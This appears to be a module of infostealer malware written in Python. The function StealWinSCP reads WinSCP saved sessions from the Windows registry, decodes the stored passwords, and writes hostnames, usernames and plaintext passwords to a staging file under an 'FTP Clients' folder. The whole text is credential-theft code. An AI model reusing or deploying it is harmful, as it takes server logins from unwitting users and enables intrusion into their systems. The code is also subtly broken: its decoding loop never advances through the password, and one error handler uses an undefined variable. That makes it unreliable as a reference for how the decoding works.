import os
import winreg


async def StealWinSCP(self, directory_path: str) -> None:
    try:
        registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
        os.makedirs(winscp_session, exist_ok=True)
        output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')
        output = "WinSCP Sessions\n\n"
        
        def decrypt_winscp_password(hostname, username, password):
            check_flag = 255
            magic = 163
            key = hostname + username
            remaining_pass = password
            flag_and_pass = decrypt_next_character_winscp(remaining_pass)
            stored_flag = flag_and_pass['flag']
            if stored_flag == check_flag:
                remaining_pass = remaining_pass[2:]
                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
            length = flag_and_pass['flag']
            remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
            final_output = ""
            for _ in range(length):
                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                final_output += chr(flag_and_pass['flag'])
            if stored_flag == check_flag:
                return final_output[len(key):]
            return final_output

        def decrypt_next_character_winscp(remaining_pass):
            magic = 163
            firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
            secondval = "0123456789ABCDEF".index(remaining_pass[1])
            added = firstval + secondval
            decrypted_result = ((~(added ^ magic)) + 256) % 256
            return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
                index = 0
                while True:
                    try:
                        session_name = winreg.EnumKey(reg_key, index)
                        session_path = f"{registry_path}\\{session_name}"
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
                            hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                            username = winreg.QueryValueEx(session_key, 'UserName')[0]
                            encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
                            password = decrypt_winscp_password(hostname, username, encrypted_password)
                            output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n\n"
                    except OSError:
                        break
                    index += 1
        except OSError as e:
            print(f"os error winscp error - {str(e)}")

        with open(output_path, 'w') as file:
            file.write(output)

    except OSError:
        print(f"all os error winscp - {str(e)}")
    except Exception as e:
        print(f"winscp error - {str(e)}")